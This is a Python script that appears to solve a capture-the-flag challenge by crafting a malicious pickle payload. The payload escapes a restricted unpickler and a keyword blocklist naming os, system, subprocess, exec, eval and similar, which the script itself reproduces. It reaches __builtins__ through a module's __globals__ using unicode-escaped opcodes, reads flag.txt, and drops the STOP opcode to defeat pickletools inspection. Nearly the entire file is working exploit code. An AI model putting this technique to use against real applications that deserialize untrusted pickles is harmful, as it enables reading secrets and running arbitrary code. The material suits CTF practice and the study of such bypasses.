import contextlib
import io
import pickle
import pickletools
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "challenge" / "challenge"))
import sessionstore  # noqa: E402,F401


BANNED_PATTERNS = [
    b".",
    b"os",
    b"system",
    b"popen",
    b"subprocess",
    b"commands",
    b"exec",
    b"eval",
    b"import",
    b"getattr",
    b"setattr",
    b"flag",
]


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module.split(".")[0] not in {"sessionstore", "collections"}:
            raise pickle.UnpicklingError(f"module {module!r} is not allowed")
        return super().find_class(module, name)


def unicode_opcode(value: str) -> bytes:
    escaped = "".join(f"\\u{ord(char):04x}" for char in value)
    return b"V" + escaped.encode("ascii") + b"\n"


def stack_global(module: str, name: str) -> bytes:
    return unicode_opcode(module) + unicode_opcode(name) + b"\x93"


def reduce_call(callable_pickle: bytes, *args: bytes) -> bytes:
    return callable_pickle + b"(" + b"".join(args) + b"tR"


def builtins_dict() -> bytes:
    globals_getitem = stack_global(
        "sessionstore", "render.__globals__.__getitem__"
    )
    return reduce_call(globals_getitem, unicode_opcode("__builtins__"))


def builtin(name: str) -> bytes:
    dict_getitem = stack_global(
        "sessionstore", "render.__globals__.__class__.__getitem__"
    )
    return reduce_call(dict_getitem, builtins_dict(), unicode_opcode(name))


def make_payload(path: str) -> bytes:
    opened = reduce_call(builtin("open"), unicode_opcode(path))
    read_method = reduce_call(builtin("getattr"), opened, unicode_opcode("read"))
    content = reduce_call(read_method)
    printed = reduce_call(builtin("print"), content)
    # Intentionally omit STOP (0x2e). Side effects happen before load() reaches EOF,
    # while pickletools.dis() raises and the challenge suppresses that exception.
    return b"\x80\x04" + printed


def main() -> None:
    target = str(ROOT / "challenge" / "challenge" / "flag.txt")
    payload = make_payload(target)
    assert not any(pattern in payload for pattern in BANNED_PATTERNS)
    try:
        pickletools.dis(payload)
    except Exception as exc:
        print(f"disassembly rejected as expected: {type(exc).__name__}")
    else:
        raise AssertionError("pickletools.dis unexpectedly accepted payload")

    output = io.StringIO()
    with contextlib.redirect_stdout(output):
        try:
            RestrictedUnpickler(io.BytesIO(payload)).load()
        except Exception:
            pass
    print(output.getvalue(), end="")


if __name__ == "__main__":
    main()
